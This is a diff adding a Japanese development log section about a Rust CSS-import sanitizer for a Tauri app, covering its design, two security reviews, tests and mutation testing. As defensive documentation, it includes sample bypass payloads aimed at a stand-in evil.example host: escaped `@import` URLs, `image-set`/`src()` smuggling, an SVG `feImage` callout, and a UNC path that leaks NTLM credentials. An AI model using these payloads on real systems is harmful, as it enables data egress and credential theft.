@@ -13340,3 +13340,394 @@ url() テストも既存の恒等変換テストも**すべて緑のまま通っ
 **この変異は同時に宣言テキストを走査対象にする＝060b の `url()` 除去と二重処理になる入口**なので、
 ネスト対応を足すときは「宣言テキストを走査しない」ことを別途担保してからにすること
 （テスト側にもその旨をコメントで残した）。
+
+## 060b カスタム CSS 取り込み基盤（Rust・保存/検証/レジストリ）（2026-08-05）
+
+`overlay_theme` モジュール（**5 分割**）＋ `overlay_themes` テーブル ＋ 5 コマンド ＋
+`comment-viewer.json` への `dialog:allow-open` 1 件。**新規依存ゼロ・`tauri.conf.json` 差分ゼロ・`csp: null` 不変。**
+
+### 着手前に確定した判断（①〜⑫・本人回答）
+
+| # | 論点 | 決定 | 根拠 |
+| --- | --- | --- | --- |
+| ① | 外部 URL 除去の方式 | **allow-list ＋ 1 点だけ fail-closed** | 下記「② deny-list を捨てた理由」 |
+| ② | 除去 URL の受け渡し | `import` の**戻り値**に載せる。**DB には持たない**。生 CSS を返す read コマンドは**作らない** | 060c は「取り込み時に 1 回・毎回の同意」なので永続化不要。§9 的にも軽い |
+| ③ | binding 出力先 | `src/features/comment-viewer/bindings/`（新ディレクトリを作らない） | `check:bindings` の列挙がハードコードで、新規ディレクトリは**ドリフトを検出できない**。`audio` / `obs_config` と同じ場所という前例もある＝ **`package.json` 差分ゼロ** |
+| ④ | `name` の UNIQUE | **張らない**（判断は `repository::init` の doc コメントに記載） | テーマは「2 つ入れて見比べる」もの。UNIQUE 違反は `StorageFailed` へ潰れて**原因の分からないエラー**になる。重複警告は 060d の UI で |
+| ⑤ | サイズ上限 | **256KB** | 060a 実測（248KB の現実的入力 12.3ms／535KB の病的入力 8.6ms）。実チャット CSS の 100 倍近い余裕 |
+| ⑤ | `name` | trim・空拒否・`reject_control_chars`・**80 文字** | 一覧 1 行に収まる長さ |
+| ⑤ | 本文の制御文字 | C0 のうち **`\t \n \r \x0C` 以外**と DEL を拒否 | ⚠ `reject_control_chars` は使えない（`char::is_control` が改行も弾く＝ CSS 本文が全滅する）。**`name` 用と本文用で規則が違う**ことをコメントに明記 |
+| ⑤ | 件数上限 | **200 件** | 取り込みコマンドは**全 4 窓から呼べる**ので、無制限にディスクが増える経路を構造側で塞ぐ |
+| ⑥ | `path` 検証 | trim・空拒否・制御文字拒否・`.css`（大小無視）・`is_file()`・サイズ（読む前／読んだ後の 2 回） | trim は `tools::service` に合わせた（帰結＝前後空白入りのファイル名は取り込めない） |
+| ⑥ | `canonicalize` / シンボリックリンク拒否 | **どちらもやらない**（理由をコメントに残す） | 保存先の組み立てに元パスが影響しない以上 canonicalize に防げるものが無い。リンク越しに読めるのはユーザーが元々読めるファイルだけ＝**特権境界を跨がない** |
+| ⑦ | 失敗時の後始末 | **書き込み → INSERT** の順。INSERT 失敗でファイルを掃除。削除は **DB 行が先** | 残るものの質が違う——孤児**ファイル**は不可視で無害、孤児**DB 行**は一覧に出て開けない**可視の故障** |
+| ⑦ | `themes/` の作成 | `lib.rs` の `setup` ではなく `service` の保存ヘルパで `create_dir_all`（冪等） | 実行中にディレクトリを消されても復旧できる。`lib.rs` の差分も `repository::init` の 1 行だけで済む |
+| ⑧ | `get_overlay_theme_css` が全 4 窓から呼べる | **受容**（security.md「Capabilities 方針」に記録） | read-only／パスを受け取らない（2 段検証）／256KB 上限／**3 窓が実際に必要とする**（注入先・プレビュー・将来の固定窓） |
+| ⑨ | エラーコード | **新設しない**（既存 4 つ） | `error.rs` の方針は「ユーザーが取れる行動が違うときだけ分ける」。区別は**作者が書いた固定文言**で行う |
+| — | モジュール分割 | **5 分割**（タスクファイルの「4 分割」から意図的に逸脱・`sanitize.rs` を独立） | サニタイザは唯一の壁なので専用の doc・テスト・ミューテーション対象を持つべき。sidecar の `host-guard.ts` と同じ作法 |
+| — | 060c 用 text 版コマンド | **共通コア `store_sanitized_css` だけ作る**（コマンドは 060c で足す） | 検証の分裂は防ぎつつ、**呼び手のいないコマンドを全 4 窓へ露出しない**（060c は実装しない判断も残る） |
+
+### ⚠⚠ deny-list を捨てた理由 —— CSS エスケープで自明に破れる
+
+タスクファイルの当初案「`http…` / `//…` に見えるものを除去する」は**そのままでは成立しない**。
+
+```css
+@import "\68ttps://evil.example/a.css";   /* \68 → h。復元すると https:// */
+@import "htt\
+ps://evil.example/a.css";                 /* 文字列内の \改行 は行継続として消える */
+```
+
+「URL が何に見えるか」で判定する方式は、判定前に CSS のエスケープを完全に復元する必要がある（＝結局パーサが要る）
+うえに、**見落としが「残す側」＝危険側に倒れる**。allow-list ではこれが反転し、生き残るには
+「**エスケープを 1 つも含まず**、リテラルで `data:` から始まる」必要がある＝**難読化された時点で自動的に除去される**。
+
+### ⚠⚠ 設計中に見つけた、タスクファイルに無い 3 つの穴
+
+1. **`@import url("data:text/css,@import url(https://evil)")`** —— **入れ子の `@import` をブラウザが辿る**＝ egress。
+   → **`data:` の許可は宣言値の `url()` 位置に限る**（`@import` は無条件で除去）。
+2. **`image-set()` は裸の文字列を URL として扱う唯一の実装済み関数**で、`var()` 置換の的になる:
+   ```css
+   --a: "https://evil.example/x.png";        /* url() でも @import でもない、ただの文字列 */
+   background-image: image-set(var(--a) 1x); /* 置換後に URL 位置へ入る＝ egress */
+   ```
+   `url()` だけを見る実装はこれを素通しする。→ **`image-set(` を含む宣言を中身に関わらず落とす**。
+   カスタムプロパティ側へ隠す形（`--a: image-set(…)`）も同時に閉じる。
+   ⚠ `var(--a)var(--b)` でトークンを継ぎ接ぎする形は、CSS の置換仕様が再トークン化を禁じているため成立しない。
+3. **`data:` にフラグメントが付く形**（security-review で発見・下記）。
+
+### 除去規則（確定）
+
+| 位置 | 動作 |
+| --- | --- |
+| `@import`（`url()` 形・素の文字列形・**`data:` 形も**） | **無条件で文全体を除去**＋計数＋宛先を戻り値へ記録 |
+| `@namespace` | 文全体を除去（取得はされないが、残すと「生きた `url(http…)` があってよい例外」ができ、残留検証が弱い不変条件に退化する） |
+| 宣言値の `url(…)` | **エスケープ無し・制御文字無し・`#` 無し・ASCII 大小無視で `data:` 始まり**のときだけ残す。それ以外は**宣言まるごと除去** |
+| `image-set()` / `-webkit-image-set()` / `image()` | **中身に関わらず宣言まるごと除去** |
+| ブロック系アットルールの**プレリュード**内の url | **取り込み自体を拒否**（fail-closed） |
+| 未終端の文字列 / コメント / `url(`、深すぎる入れ子 | 除去または拒否（**「残す」判断を絶対にしない**） |
+
+- **相対 URL（`url(/x.png)`）は egress ではない**（webview のオリジンは Tauri のカスタムプロトコル）。
+  それでも allow-list により除去される＝規則を 1 本に保つため。⚠ **`url(//evil/x.png)`（プロトコル相対）は
+  Windows では実 egress**（オリジンが `http:`）なので、「相対だから安全」と読み替えないこと。
+- **`url(#frag)` も除去する**。egress にはならないが、ユーザー CSS からオーバーレイ DOM に SVG を持ち込む手段が無く
+  **実用上死んでいる**ため、許可形を `data:` 1 つに絞って security.md の字面と揃えた。
+
+### アルゴリズムと限界
+
+- **正規表現を使わない手書きトークナイザ**（`sanitize.rs`・約 400 行・**新規依存ゼロ**）。
+  コメント／文字列（`\` エスケープ・16 進エスケープ・**行継続**）／`url()` の引用符あり・なし／
+  アットルールのプレリュードとブロックを CSS 仕様に沿って読む。
+  **識別子はアンエスケープしてから比較する**のが迂回対策の中核（`\75 rl(` / `u\72 l(` / `\000075rl(` / `@\69 mport`）。
+- **中身は「`;` で終わる文」と「`{` で始まるブロック」の列として一様に扱う**。この一様化のおかげで
+  `@media` / `@supports` / `@font-face` / `@keyframes` / CSS Nesting / **波括弧を値に持つカスタムプロパティ**
+  （`--foo: { … }`）を個別に知らなくても正しく走査できる。
+- **削除は「残す部分だけを写す」方式**（削除区間の補集合を書き出す）＝位置ずれのバグが構造的に起きない。
+- **残留検証**（post-condition）: 出力をもう一度走査し、許可形以外の url 位置が残っていたら**拒否**する。
+  ⚠ 同じトークナイザを使うので**トークナイザ自体のバグは検出できない**が、
+  **ブロック構造の解釈がずれた場合は「url が漏れる」ではなく「取り込みが拒否される」へ劣化する**。
+- **無限ループが構造的に不可能**（全分岐が index を必ず前進させる）。入れ子は 64 段で拒否（スタックオーバーフロー＝
+  abort を作らない）。**256KB の入力で線形**（回帰ガードを常設・閾値は指数爆発だけを捕まえる 3 秒）。
+- ⚠ **既知の限界**: `url(data:image/svg+xml,…)` の SVG 内部は解釈しない。**フラグメント無し**の SVG data URI は
+  「画像としてしか読まれない」＝ secure static mode で外部参照が仕様上禁止される、というブラウザ側の保証に依存している。
+  再修正トリガー＝その保証が破れる CVE が出たら `data:` の MIME 許可リストへ踏み込む。
+
+### 実サンプル CSS での実測（依頼者の 2 本・`cssCompat.test.ts` から逐語で流用）
+
+| サンプル | `strippedCount` | `strippedImportUrls` | 出力 |
+| --- | --- | --- | --- |
+| YouTube | **1** | `["https://ruri.info/tool/css/midashi1Comment.css"]` | 先頭の `@import` 行だけが消え、**残りはバイト単位で無改変** |
+| Twitch | **1** | `["https://ruri.info/tool/css/twmidashi1Comment.css"]` | 同上 |
+
+冪等（2 周目は `strippedCount=0`・出力一致）も固定した。⚠ 第三者資産（ruri.info の CSS）は
+**リポジトリに一切コピーしていない**（060a と同じ扱い・URL のみ）。
+
+### ⚠⚠ 実機での期待値 —— 「見た目がほぼ変わらない」が正しい
+
+060a が実サンプルから確認したとおり、**このサンプル 2 本には意匠がほとんど無い**（中身は外部 `@import` 1 行＋
+書体指定＋`--txtcolor`）。したがって:
+
+- **060b 単体では見た目は 1px も変わらない**（注入は 060d）。
+- **060d まで作っても「書体しか効かない」**——吹き出しの意匠は**丸ごと除去した `@import` の中**にある。
+- **060c で初めて意匠が出る。** ＝ **これは仕様どおりで、バグではない。**
+
+### security-review（2026-08-05・判定「軽微な懸念あり」・**指摘 3 件は実装へ反映済み**）
+
+読むだけでは走査型スキャナの穴は見つからないので、**敵対的入力 20 本を実際に通して出力を目視**した
+（055e の教訓＝自分のガードの主張を裏返す変異だけでは、ガードが見ていない領域の穴は見つからない）。
+
+**R-1（Medium・適用済み）— `data:` にフラグメントが付くと SVG を「リソース文書」として読ませられる。**
+`data:` を許す根拠は「SVG を**画像として**読む経路は secure static mode になり外部参照が仕様上禁止される」ことだが、
+**`filter:` / `mask:` / `clip-path:` は SVG を画像ではなくリソース文書として読む**ので、その保証が及ぶとは限らない。
+実測で以下が**素通りしていた**:
+
+```css
+.a{ filter: url("data:image/svg+xml,<svg><filter id='f'><feImage href='https://evil/x'/></filter></svg>#f") }
+```
+
+→ **リソース参照は対象要素を指すために必ずフラグメントを要する**ので、**`#` を含む `data:` を落とす**ことで
+この経路がまとめて閉じる。⚠ 正当な損失はほぼゼロ（data URI 本体の生の `#` はフラグメント扱いになってそもそも壊れるので
+実在の SVG data URI は `%23` を使う。base64 の文字集合に `#` は無い）。**フラグメント無しの SVG data URI は残す**
+（消しすぎない担保もテストで固定）。
+
+**R-2（Low・適用済み）— 引用符なし `url-token` の中の引用符。**
+CSS 仕様では bad-url-token になりブラウザは宣言ごと捨てるが、実装は普通の文字として飲み込んでいた。
+`url(data:x")url("https://evil")` のような入力で**ブラウザとトークン境界の解釈が分かれる余地**が残るので、
+**常に「壊れている」側へ倒す**ようにした（＝必ず除去側になる）。
+
+**R-3（Medium・適用済み・可用性）— 取り込みが DB ロックを跨いでファイル I/O をしていた。**
+`path` はユーザーが dialog で選んだ場所＝**ネットワークボリューム上にありうる**。読み込みを `db.lock()` の
+内側で行っていたため、応答しないボリュームを掴むと**アプリ全体の DB コマンド（コメント記録・プリセット起動・ログ）が
+まとめて止まる**構造だった。→ **読み込みをロックの外へ出した**（`read_import_source` → ロック取得 → `import_local_source`）。
+この順序は契約テストで固定してある。
+⚠ `get_overlay_theme_css` は同じ形にしていない——読むのは `app_data_dir`（常にローカル）配下の ≤256KB で、
+**パス解決と読み取りを 1 つの関数に閉じておくほうがセキュリティ不変条件として強い**ため（意図的な非対称）。
+
+**確認して問題なしとしたもの**: 外部通信ゼロ（契約テストが `reqwest` 等の出現を止めている）／
+汎用の書き込み・任意パス読み取りコマンドが生えていない（コマンド数・`path: String` の出現回数を固定）／
+`name` にトラバーサル形を入れても管理ディレクトリ外へ出ない（`is_managed_file_name` の直接テスト＋実 I/O テスト）／
+ログにも `AppError` にも CSS 本文・フルパス・除去 URL が出ない（マーカー文字列で実測）／
+capability は `dialog:allow-open` 1 件のみ／`</style>` を含む CSS は**そのまま保存する**（正当な CSS なので除去しない。
+注入経路を `textContent` に限る責務は 060d 側で、security.md のレビュー必須条件に既記載）。
+
+### テスト（**+65 件 → Rust 222 passed**。内訳＝`sanitize` 28 ／ `service` 26〔仕様 18 ＋ 契約 8〕／ `repository` 8 ／ ts-rs の binding 出力 3）
+
+- **`sanitize.rs`（28 件）**: 実サンプル 2 本の出力を全文固定／`data:` が全ての値位置で残る（バイト一致）／
+  `@import` が全形で消える（`data:` 形を含む）／外部・相対・`#frag` の `url()` が宣言ごと消える／
+  `image-set` が中身に関わらず消える／**`var()` 密輸**／カスタムプロパティ（`url` 入りは消え、`{}` 入りは残る）／
+  **迂回**（CSS エスケープ 3 種・大文字・コメント挿入・改行・文字列内の行継続・エスケープされた `data:`）／
+  **`#` 付き `data:`**／**引用符なし url-token 内の引用符**／プレリュード url の拒否（**専用の診断文言まで固定**）／
+  入れ子上限／恒等変換 17 ケース（`@charset` / `@layer` 文とブロック / `@supports>@media` / `@keyframes` /
+  `@container` / CSS Nesting / **宣言の途中のコメント** / 文字列中の `}` / 属性セレクタ）／
+  敵対的入力 21 本で panic もハングもしない／冪等 5 形／**256KB の計算量ガード**／clamp／エラーが入力を持ち帰らない。
+- **`service.rs` の仕様テスト（18 件）**: `is_managed_file_name` の 16 ケース／`name` の検証（**U+0085 が Rust では弾かれ JS 正規表現では通る**
+  ことをコメント付きで固定）／本文の制御文字（空白 4 種は通す）／BOM／サイズ境界／パス検証（拡張子・大小・
+  ディレクトリ・不在・サイズ）／バイナリ拒否／**エラーがフルパスを出さずファイル名だけ出す**／
+  取り込みが `<uuid>.css` を 1 つだけ作る（元ファイル名もテーマ名も現れない）／**`../evil` 等 5 種の名前で外へ出ない**／
+  削除がファイル実体も消す・二重削除・ファイルが先に消えていても成功／不正 id は disk に触れず NotFound／
+  件数上限／**拒否時に孤児が残らない**／**INSERT 失敗時に孤児ファイルが残らない**（トリガーで INSERT だけ失敗させる）。
+- **契約テスト（8 件）**: コマンド数 5・`async fn` 1 本・`path: String` の出現 1 回・`content`/`css`/`bytes`/`data` を
+  受け取らない／`app_data_dir()` と `join(THEMES_DIR)` と `dir.join(file_name)` が各 1 か所／
+  **検証が実際に呼ばれている**（`is_managed_file_name` / `sanitize_css` / 各 validate / 残留検証の**存在**を固定）／
+  `cssCompat` を再実装・参照していない／HTTP クライアントが無い／**読み込みが DB ロックより前**／
+  本番ロジック 5 ファイルに panic 経路ゼロ／ファイル数の固定。
+- **`repository.rs`（8 件）**: `init` 冪等／往復／**同名を許す**（UNIQUE を足した変更で落ちる）／新しい順／
+  `update_name`／二重削除／未知の `origin` が `Local` へ劣化／`snapshot` の往復。
+
+### ミューテーション（**31 種すべて KILLED**。うち 4 種はテストを足して初めて殺せた＝実際の穴）
+
+| 変異 | 結果 |
+| --- | --- |
+| allow-list を素通し／識別子のエスケープを復元しない／`url` を大小区別で比較／`@import` の素の文字列形を見ない／文字列の行継続で `has_escape` を立てない／引用符なし url-token を `data:` 扱いで通す／`image-set` の無条件除去をやめる／`@import` を無条件除去しない／`-webkit-image-set` を判定表から外す／文字列スキップを外す／削除範囲から `;` を外す／残留検証から `url()` の検査を落とす／clamp 2 種を外す | **KILLED** |
+| 保存ファイル名を `name` 由来にする／サイズ上限の比較を反転／`managed_path` の検証を外す／保存経路がサニタイザを通らない／`name` と本文の制御文字チェックを外す／件数上限を外す／`delete` がファイルを消さない／入れ子上限を外す／`data:` の `#` 拒否を外す／引用符を普通の文字にする／読み込みを DB ロックの内側へ戻す | **KILLED** |
+| ⚠ **プレリュード url の fail-closed を外す** | 初回**生存** → テストを補強して KILLED |
+| ⚠ **INSERT 失敗時の孤児ファイル掃除を外す** | 初回**生存** → トリガーで INSERT を失敗させるテストを新設して KILLED |
+| ⚠ **`url(` 直後の空白スキップを外す** | 初回**生存** → `url( "data:…" )` が残る担保を新設して KILLED |
+| ⚠ **本文ループのコメントスキップを外す** | 初回**生存** → **宣言の途中**のコメントを恒等変換の表に足して KILLED |
+
+⚠ **「プレリュード url の fail-closed を外す」が生存したのは、実は 2 層が本当に冗長だったから**——
+プレリュードは削除対象にならないので url が出力に残り、**残留検証が拾って拒否する**。
+それでもこの経路を残すのは**ユーザーに出る文言が変わる**から（「@media などの条件部分に外部参照が…」と
+言えるのはこちらだけ）。テストは診断文言まで照合するようにして、その品質が静かに失われる変更を止めた。
+
+⚠ **「本文ループのコメントスキップ」が最初の 4 ケースで殺せなかった理由**は、**文の先頭のコメントは
+`skip_ws_and_comments` が先に食ってしまう**ため。`.a{/*…*/color:red}` では観測できず、
+`.a{color:/*…*/red}` で初めて落ちる。**同じ構文要素でも位置を変えないと検査が空振りする**という
+060a の「長い順ソートが実質空振りだった」と同型の事故。
+
+### 変更ファイル
+
+- **新規**: `src-tauri/src/overlay_theme/{mod,commands,service,sanitize,repository,model}.rs`
+- **変更**: `src-tauri/src/lib.rs`（`mod` 1 行 ＋ `repository::init` 1 行 ＋ `generate_handler!` 5 行）／
+  `src-tauri/capabilities/comment-viewer.json`（**`dialog:allow-open` 1 件のみ**）
+- **生成**: `src/features/comment-viewer/bindings/OverlayThemeRecord.ts` / `OverlayThemeOrigin.ts` / `OverlayThemeImportResult.ts`
+- **docs**: `security.md`（§5 例外節を新設＝**055d に続き 2 回目** ／ Capabilities 方針 ／ ## CSP方針 ／ §10）／
+  `progress.md`（本節）／`task-board.md`／`tasks/060b-*.md`
+
+### ゼロ拡大の実測（すべて差分ゼロを確認）
+
+`tauri.conf.json` ／ `apps/comment-sidecar/` ／ `.github/` ／ `Cargo.toml` ／ `Cargo.lock` ／
+`apps/desktop/package.json` ／ `pnpm-lock.yaml` ／ ルート `package.json`（**新規依存ゼロ**）／
+`cssCompat.ts` ／ `CommentList.tsx` ／ `OverlayComment.module.css`（**060a の成果物は無改変**）／
+`default.json` ／ `comment-overlay.json` ／ `pinned-overlay.json`。
+
+### 検証
+
+`cargo check` ✅ ／ `cargo test` ✅ **235 passed**（+78＝ 060b の 65 ＋ review② の 6 ＋ 仕様ギャップ 7）／ `typecheck` ✅ ／ `lint` ✅ ／
+`test` ✅ **870 passed / 39 files**（frontend は無改変なので増減ゼロ・CSS guard OK ／ Version sync OK）／
+`check:bindings` ✅。
+
+⚠ **`grep -rn "unwrap()\|\.expect(" apps/desktop/src-tauri/src/overlay_theme/` は「OK: panic 経路無し」にならない。**
+`commands.rs` の `db.lock().expect("db mutex poisoned")` が**リポジトリ全体の標準イディオム**（37 箇所）で、
+`lib.rs` の `WINDOW_OPEN_LOCK` の注記が「**データ持ちの Mutex は poison=`expect` を維持する**」と明示しているため。
+ここだけ別の書き方にする理由が無いので**イディオムに従い**、契約テストを 2 段にした——
+**本番ロジックの 5 ファイルは panic 経路ゼロ**、`commands.rs` はこのイディオムだけを許して**出現数（5）を固定**する。
+
+### security-review②（外部レビュー・2026-08-05・判定「**修正必須**」・**指摘 8 件すべて反映済み**）
+
+⚠⚠ **自前の security-review が「軽微な懸念あり」で通した後に、実測で 2 件の除去漏れが見つかった。**
+レビュー側は敵対的入力 60 本超を `sanitize_css` へ実際に通して出力を目視し、
+**修正候補を当てて既存 65 件が green のまま塞がることまで実測**している。
+
+**S-1（High・修正済み）— 非 ASCII 文字が `url(` の直前にあると、除去も残留検証もすり抜ける。**
+`is_ident_char` が `>= 0x80` を ident 文字に含めていたため、貪欲読みと相まって **`<NBSP>url` が 1 つの
+識別子**になり `lower == "url"` に一致しなかった。さらに `scan_unit` / `find_residual_violation` の
+`_ if is_ident_char(c)` アームが**名前を捨てていた**（`(` の確認すらしない）ので二重に見逃していた。実測:
+
+| 入力 | 出力 | `stripped_count` | 残留検証 |
+| --- | --- | --- | --- |
+| `.a{background:<NBSP>url(https://evil…)}` | **入力と同一** | 0 | `None` |
+| `<EM SPACE>` / `×`(U+00D7) / `→`(U+2192) 前置 | 同一 | 0 | `None` |
+| `.a{background-image:<NBSP>image-set("https://evil…" 1x)}` | 同一 | 0 | `None` |
+| `@import<NBSP>url("https://evil…");` | **`@import` 文が丸ごと残る** | 0 | `None` |
+
+css-syntax-3 の現行仕様では U+00A0 / U+00D7 / U+2003 / U+2192 は **ident code point ではない**ので、
+仕様どおりの実装はここを分割して `url(` を url-token として読む＝ egress。Blink / WebKit は歴史的に
+`>= 0x80` を ident-start にしているため今日は fetch されない公算が高いが、**WKWebView / WebView2 は
+OS 更新で入れ替わる**＝我々のコードを変えずに前提が壊れる。⚠ **module doc が掲げた「判定の失敗が常に
+安全側へ倒れる」に反して、engine の実装詳細に賭けて危険側へ倒れていた**のが本質。
+→ **`is_ident_char` を ASCII のみに**（「我々が分割してブラウザが結合する」＝過剰除去にしか倒れない）。
+`_ if is_ident_char(c)` の近道アームは削除して 1 本に統合。`.配信用{…}` / `--画像:` / 日本語 `content:` が
+誤爆しないことをテストで固定。
+
+**S-2（Medium-High・修正済み）— `src()`（CSS Values 4）が判定表に無かった。**
+`src:src("https://evil…")` / `background-image:src(var(--u))` が**素通りしていた**。`src()` は
+`<url> = <url()> | <src()>` の片割れで、**`<string>` を取り `var()` 置換可能であることが存在理由**の
+URL 関数＝ `image-set()` を落とした理由の一般形そのもの。初版の「`image-set()` は裸の文字列を URL 化する
+**唯一の実装済み**関数」という理由づけが、**壁の寿命を engine のリリースサイクルに委ねていた**。
+→ 表へ `src` を追加し、定数名を `IMAGE_FUNCTIONS` → **`BARE_STRING_URL_FUNCTIONS`** へ改名。
+**再修正トリガー＝新しい CSS の画像 / URL 関数が仕様に入ったら、実装状況を問わず表へ足す**と明記。
+
+**S-3（Medium・docs 修正）— security.md §5 例外節の「読んだ内容は frontend へ返らない」が実装と不一致。**
+`import_overlay_theme(path)` → `get_overlay_theme_css(id)` の 2 コールで全文が返る＝**合成すると
+「拡張子 `.css` に限定された任意ファイル読み取り」**になる（しかも ACL 対象外＝全 4 窓から呼べ、
+`path` が dialog 由来かは Rust から確かめられない）。実害は小さいが、**webview には `fs` plugin も
+asset protocol も無く「ファイルを読む手段がゼロ」だった**ところに読み取り経路を 1 本新設した事実は
+例外の承認根拠として書かれるべき。→ コードは変えず、**§5 と Capabilities 方針の記述を実装に合わせた**
+（受容理由 4 点と再修正トリガーつき）。
+
+**S-4（Medium・Windows・修正済み）— UNC パスで SMB 外向き接続＋資格情報漏えい。**
+`validate_source_path` が絶対/相対もボリューム種別も見ずに `fs::metadata` を叩いていたため、
+`\\evil.example\share\x.css` を渡すと **OS が攻撃者ホストへ SMB 接続し、既定設定では NTLM で
+資格情報ハッシュが飛ぶ**（ユーザー操作ゼロ）。⚠ 自前レビューの R-3 はネットワークボリュームを
+**可用性**の問題としてしか見ておらず、**egress と資格情報の面が抜けていた**。
+→ `\\` / `//` 始まりを**拡張子チェックより前**に拒否（ディスクにもネットワークにも触らない）。
+
+**S-6（Low-Medium・修正済み）— `stripped_import_urls` が 060c の同意ダイアログを騙せる。**
+`record_import_url` が `char::is_control` しか見ていなかったため、`javascript:` / `file:` / 相対 URL /
+`data:text/css,…` に加えて **bidi / format 文字（U+202E 等）が素通り**していた。userinfo と組み合わせると
+`https://ruri.info@evil.example/a.css` のように**別ホストに見える文字列**を同意ダイアログへ出せる。
+→ **`http://` / `https://` の絶対 URL のみ**へ限定し、bidi/format 文字を拒否。載せなかったぶんも
+`stripped_count` には数える（＝乖離が広がることを doc に明記）。
+
+**S-7（Low・修正済み）— `@supports` のサポート検出が誤診断つきで全拒否されていた。**
+プレリュード判定が `any_url_position`（**許可形の `data:` でも立つ**）だったため、
+`@supports (background:url(data:image/png;base64,AA)){…}` や実在イディオム
+`@supports (background-image:-webkit-image-set(url(a.png) 1x)){…}` が「条件部分に**外部参照**が…」と
+**事実と違う文言で拒否**されていた。→ `unit.disallowed > 0 || unit.image_fn` に狭め、文言も
+「取り除けない参照」へ改めた（許可形を通しても残留検証が素通しするので安全性は不変）。
+
+**S-5（Medium・未修正・実測待ち）— フラグメント無しの SVG data URI。**
+`.a{filter:url("data:image/svg+xml,…<feImage href='https://evil…'/>…")}`（`#` なし）が
+**そのまま保存される**ことを実測で確認した（fetch されるかは未確認）。⚠ **MIME 許可リストへ踏み込む前に
+実測する**のが正しい順序（実測せずに `image/svg+xml` を落とすと、SVG アイコンを data URI で入れる
+実在のチャット CSS を無用に壊す）。**アプリ不要・5 分の手順を `sanitize.rs` の「既知の限界」に記載した**
+（`python3 -m http.server 8000` ＋ 素の HTML を Safari / Edge で開き、アクセスログに `HIT` が出るか）。
+→ **本人の手番。結果は必ずここに追記すること。**
+
+**S-8（Low・別タスク）— `check:bindings` は未追跡ファイルを検出できない。**
+実体が `git diff --exit-code` なので、**新規生成した binding は初回コミットまで検査対象にならない**
+（今回の 3 本の緑は空振りだった）。`rakuraku/bindings/` の列挙漏れ（既知）と合わせて、
+**列挙方式そのものではなく `git diff` の対象範囲**の問題。`package.json` を触るので別タスクへ。
+判断は `model.rs` の module doc に記録。
+
+**品質面の反映（4 件）**: **Q-2** 契約テストの `assert_present_in` が**引数の変数名**に依存していて
+rename-only のリファクタで「検証が外された」と**誤診断**する（060a レビュー (5-b) の戒め）→ needle は
+そのままにして**失敗メッセージに「引数名を変えただけならテストを直す」と明記** ／ **Q-3** 対応の取れていない
+`(` があるとそこから EOF までが 1 宣言になり、参照が 1 つあれば**残り全部が消えて `stripped_count` は 1**
+（実測 `.a{width:calc(100% - 10px;}` → 出力 `.a{`）。⚠ ブラウザも同じ範囲を捨てるので**意味論は一致**しており
+セキュリティ問題ではないが、UI からは分からない → **060d へサイズ比の警告を申し送り**（`model.rs` に記載）／
+**Q-6** `import_overlay_theme` は `async` でも中身はブロッキング I/O ＝「メインスレッドは止まらないが
+ワーカーを 1 本塞ぐ」が正確（本来形は `spawn_blocking`）→ コメントを実態に合わせ、再修正トリガーを追記 ／
+**Q-8** `expect` の出現数を定数 5 で固定していた（DB ロックを取らないコマンドを足すと偽陽性）→
+「全 `expect` が db mutex のものと一致」＋「コマンド数を超えない」の 2 条件へ。
+
+**確認して問題なしとされたもの（レビュー側の実測）**: エスケープ迂回 7 パターン（`\75rl(` 空白なし /
+`\000075 rl(` / `u\00072l(` / `\75`+CRLF+`rl(` / `ur\6C(` / `@\49 MPORT` / `\@import`）／
+アットルール 12 種（`@counter-style{symbols:url()}` / `additive-symbols` / `@property{initial-value}` /
+`@page` / `@scope` / `@starting-style` / `@position-try` / `@container` / `@layer` /
+`@font-feature-values` / `@media>@font-face` / ネスト内 `@import`）**すべて個別対応ゼロで正しく除去**／
+CSS Nesting 4 形／属性セレクタ内の `{` `}`・`:not(;)`・`--x:(})`・`.a\7d `／
+**ブラウザと解釈が分かれうる箇所が軒並み安全側**（`url(data:…(x)` はブラウザが bad-url で捨てる・
+`url("data:…"/*c*/)` は我々が落とす・`url/**/(…)` と `\3C url(…)` を残すのは正しい＝どちらも url-token に
+ならない）／`is_managed_file_name` の Windows パス表現・ADS・Unicode 正規化／
+**拡張子チェックが `fs::metadata` より前**＝非 `.css` パスの存在オラクルにならない／
+`log_command_err` は `ErrorCode::log_message()` と `code` しか書かない（`details` のファイル名も
+`stripped_import_urls` もログ DB へ到達する経路が無い）／ゼロ拡大 13 項目。
+
+### 仕様ギャップを埋めるテスト追加（+7 件・**5 種のミューテーションで実効性確認済み**）
+
+review② の反映後に「**docs が仕様として主張しているのに、それを守る検査が 1 つも無い**」箇所を洗い出して追加した。
+⚠ **どれも「実装に合わせて書いた」のではなく「docs の主張を検査に落とした」もの**である。
+
+| テスト | 何を仕様として固定するか | 出典 |
+| --- | --- | --- |
+| `a_tampered_file_name_in_the_database_never_escapes_the_managed_directory` | **§5 の出口側**（読み・削除）で `managed_path` が最後の砦として効く。⚠ 既存の `a_traversal_shaped_name_…` は**入口側**（`name` がファイル名に使われない）の担保で、`managed_path` 自体は踏んでいなかった。⚠ **絶対パスを入れるのが最強の検査**＝ Rust の `Path::join` は絶対パスを渡すと元パスを捨てるので、検証を外すと任意ファイル読み取りになる | security.md §5 例外節 |
+| `a_bom_is_stripped_before_sanitizing_so_the_import_target_is_still_reported` | **`validate_css_body`（BOM 剥がし）→ `sanitize_css` の順序**。逆順だと `scan_unit` はアットキーワードを**文の先頭でしか**読まないので `@import` として認識されない。⚠ **除去自体は `url()` 経由で起きるため出力だけ見ても気づけない**——現れ方は「060c の同意ダイアログに宛先が出なくなる」 | `validate_css_body` の doc |
+| `a_style_end_tag_survives_the_round_trip_because_060d_must_inject_via_text_content` | **`</style>` を含む CSS はそのまま保存する**（正当な CSS なので除去しない）。ここが変わると 060d の「注入は `textContent`」という不変条件が**不要になったと誤解される** | security.md「CSP方針」060b 節 |
+| `the_nesting_limit_accepts_the_documented_depth_and_refuses_exactly_one_more` | 入れ子上限の**境界そのもの**（64 段は通り 65 段で拒否）。既存テストは MAX+5 なので `>` → `>=` の変異が生存していた。上限は「スタックオーバーフロー＝ abort を作らない」ための値＝**緩む方向のずれは安全性に直結** | `MAX_NESTING_DEPTH` の doc |
+| `every_bidi_and_format_character_keeps_a_target_out_of_the_consent_list` | S-6 の bidi 拒否を**各範囲の両端**で（U+061C / U+200E-F / U+202A-E / U+2066-9）。実装が範囲で書いてあるので 1 つ外れても既存テストでは気づけなかった | security.md「CSP方針」060b 節 |
